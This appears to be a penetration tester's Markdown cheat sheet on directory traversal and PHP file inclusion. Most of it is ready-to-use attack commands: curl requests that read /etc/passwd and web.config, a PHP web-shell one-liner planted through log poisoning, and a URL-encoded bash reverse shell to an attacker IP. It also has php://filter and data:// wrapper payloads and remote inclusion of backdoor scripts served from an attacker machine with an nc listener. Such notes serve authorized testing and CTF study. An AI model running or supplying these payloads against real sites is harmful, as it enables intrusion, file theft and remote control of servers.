# Directory traversal

Example: `curl http://vulnsite/index.php?page=../../../../../../etc/passwd`
Windows (check both `/` and `\`):
```
curl http://vulnsite/index.php?page=..\..\..\..\..\..\Windows\System32\drivers\etc\hosts
curl http://vulnsite/index.php?page=../../../../../../inetpub\logs\LogFiles\W3SVC1\
curl http://vulnsite/index.php?page=../../../../../../wwwroot\web.config
```

Grafana CVE: https://golangexample.com/cve-2021-43798-grafana-8-x-path-traversal-pre-auth/ \
Apache 2.4.49 CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773

## File inclusion

### Local file inclusion

Php snipet:
```
<?php echo system($_GET['cmd']);?>
```
and poison the log files with a Header (e.g. [User-Agent](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent)) or another user controled field. Then traverse the directories to the log file:
```
http://sitetohack/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F___AttackerIP___%2F___AttackerPort___%200%3E%261%22
```

Wrappers:
- all: https://www.php.net/manual/en/wrappers.php
- php: https://www.php.net/manual/en/wrappers.php.php
- data: https://www.php.net/manual/en/wrappers.data.php

Examples:
```
curl http://site/index.php?page=php://filter/resource=somepage.php
curl http://site/index.php?page=php://filter/convert.base64-encode/resource=somepage.php
curl http://site/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl http://site/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"

### Remote file inclusion

Examples:
- https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/php/simple-backdoor.php
- https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```
kali$ python -m http.server 80
kali$ curl "http://sitetohack/index.php?page=http://IpAttacker/simple-backdoor.php&cmd=ls"
kali$ nc -lnvp 4444
kali$ curl "http://sitetohack/index.php?page=http://IpAttacker/php_reverse_shell.php"
```

Interactive TTY: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
```
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'
```


## File upload

## Command injection

